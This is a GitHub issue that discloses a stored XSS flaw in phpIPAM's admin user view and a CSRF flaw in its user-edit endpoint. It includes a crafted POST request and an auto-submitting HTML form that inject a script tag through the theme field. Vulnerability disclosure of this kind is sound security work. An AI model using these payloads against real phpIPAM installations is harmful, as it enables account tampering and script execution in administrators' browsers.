# XSS (Stored) in /app/admin/users/print-user.php (CSRF too: /app/tools/user-menu/user-edit.php) #2326

## Description

[![@magicOz](https://avatars.githubusercontent.com/u/7303376?v=4&size=48)](/magicOz)[magicOz](https://github.com/magicOz)opened [on Nov 21, 2018](https://github.com/phpipam/phpipam/issues/2326#issue-383283843)

 `<td><?php print $user->theme=="" ? _("Default") : $user->theme ?></td>`

in **/app/admin/users/print-user.php** is vulnerable to XSS.

Poc1:

Attacker:

Change **theme** parameter in user settings.

`POST /app/tools/user-menu/user-edit.php`

`real_name=test&email=test%40test.com&password1=&password2=&theme=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&lang=1&mailNotify=No&mailChangelog=No&menuCompact=1&menuType=Dynamic`

Victim:

View attacker user in admin panel

(/index.php?page=administration&section=users&subnetId=ID)

[![screenshot from 2018-11-21 21-24-38](https://user-images.githubusercontent.com/7303376/48866693-048d0300-edd4-11e8-840c-fb38f0f7b08a.png)](https://user-images.githubusercontent.com/7303376/48866693-048d0300-edd4-11e8-840c-fb38f0f7b08a.png)

Poc2:

**/app/tools/user-menu/user-edit.php** is vulnerable to CSRF.

An attacker can create a page with the following snippet and cause any user to change their settings and later trigger the XSS-vuln.

`<﻿form method="POST" action="http://localhost/phpipam/app/tools/user-menu/user-edit.php">`

`<input type="hidden" value="test" name="real_name">`

`<input type="hidden" value="test@test.com" name="email">`

`<input type="hidden" value="" name="password1">`

`<input type="hidden" value="" name="password2">`

`<input type="hidden" value="<script>alert('XSS');</script>" name="theme">`

`<input type="hidden" value="1" name="lang">`

`<input type="hidden" value="No" name="mailNotify">`

`<input type="hidden" value="No" name="mailChangelog">`

`<input type="hidden" value="1" name="menuCompact">`

`<input type="hidden" value="Dynamic" name="menuType">`

`<input type="submit" value=""></form>`

`<script>document.forms[0].submit();</script>`
